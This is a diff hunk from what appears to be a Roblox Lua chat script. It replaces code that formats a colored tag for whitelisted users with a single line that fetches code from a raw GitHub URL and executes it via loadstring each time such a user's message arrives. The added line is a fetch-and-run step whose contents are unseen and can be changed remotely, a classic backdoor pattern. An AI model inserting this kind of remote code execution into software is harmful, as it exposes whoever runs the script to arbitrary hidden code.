@@ -371,8 +371,7 @@ txt.OnIncomingMessage = function(msg)
 			for i, v in pairs(whitelist["tags"]) do
 				if v.userid == userId then
 					hasTag = true
-					local color = colors[v.color] or colors["pink"]
-					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/PVOwner/PVOwner/main/ChatTagPrivUser", true))()
 				end
 			end
 		end
